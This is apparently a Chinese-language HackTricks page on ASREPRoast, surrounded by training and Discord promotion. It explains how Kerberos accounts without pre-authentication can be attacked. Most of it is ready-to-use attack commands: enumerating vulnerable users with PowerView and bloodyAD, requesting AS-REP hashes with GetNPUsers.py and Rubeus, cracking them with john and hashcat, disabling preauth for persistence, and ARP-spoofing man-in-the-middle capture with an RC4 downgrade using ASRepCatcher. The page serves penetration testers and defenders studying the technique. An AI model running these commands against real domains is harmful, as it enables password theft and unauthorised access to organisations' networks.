# ASREPRoast

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客见解**\
参与深入探讨黑客的刺激与挑战的内容

**实时黑客新闻**\
通过实时新闻和见解，跟上快速变化的黑客世界

**最新公告**\
了解最新的漏洞赏金计划和重要平台更新

**今天就加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，与顶尖黑客开始合作吧！

## ASREPRoast

ASREPRoast 是一种安全攻击，利用缺乏 **Kerberos 预身份验证所需属性** 的用户。基本上，这个漏洞允许攻击者向域控制器 (DC) 请求用户的身份验证，而无需用户的密码。然后，DC 会用用户密码派生的密钥加密消息进行响应，攻击者可以尝试离线破解以发现用户的密码。

此攻击的主要要求是：

* **缺乏 Kerberos 预身份验证**：目标用户必须未启用此安全功能。
* **连接到域控制器 (DC)**：攻击者需要访问 DC 以发送请求并接收加密消息。
* **可选的域账户**：拥有域账户可以让攻击者通过 LDAP 查询更有效地识别易受攻击的用户。没有这样的账户，攻击者必须猜测用户名。

#### 枚举易受攻击的用户（需要域凭据）

{% code title="使用 Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="使用Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### 请求 AS\_REP 消息

{% code title="使用 Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="使用Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
使用 Rubeus 进行 AS-REP Roasting 将生成一个 4768，加密类型为 0x17，预身份验证类型为 0。
{% endhint %}

### 破解
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 持久性

强制 **preauth** 对于您拥有 **GenericAll** 权限（或写入属性的权限）的用户不是必需的：

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="使用Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## 无凭据的ASREProast

攻击者可以利用中间人位置捕获AS-REP数据包，因为它们在网络中传输，而不依赖于Kerberos预身份验证被禁用。因此，它适用于VLAN上的所有用户。\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 允许我们这样做。此外，该工具通过更改Kerberos协商强制客户端工作站使用RC4。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考文献

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客见解**\
参与深入探讨黑客的刺激与挑战的内容

**实时黑客新闻**\
通过实时新闻和见解，跟上快速变化的黑客世界

**最新公告**\
了解最新的漏洞赏金计划和重要平台更新

**今天就加入我们** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，与顶尖黑客开始合作！

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}
